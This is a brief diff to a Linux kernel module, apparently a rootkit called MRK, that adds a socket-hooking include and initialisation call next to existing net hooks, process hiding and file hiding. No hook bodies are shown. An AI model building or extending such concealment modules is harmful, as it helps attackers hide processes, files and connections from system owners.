@@ -9,6 +9,7 @@
 #include <linux/slab.h>
 
 #include "headers/networking.h"
+#include "headers/sockets.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Yanay Goor");
@@ -393,6 +394,7 @@ void MRK_exit(void) {
 
 static int __init MRK_initialize(void) {
     MRK_init_nethook();
+	MRK_init_sockets_hook();
     init_hidden_processes();
 	hide_file(test_path_name);
 	hide_file(test_path_name2);
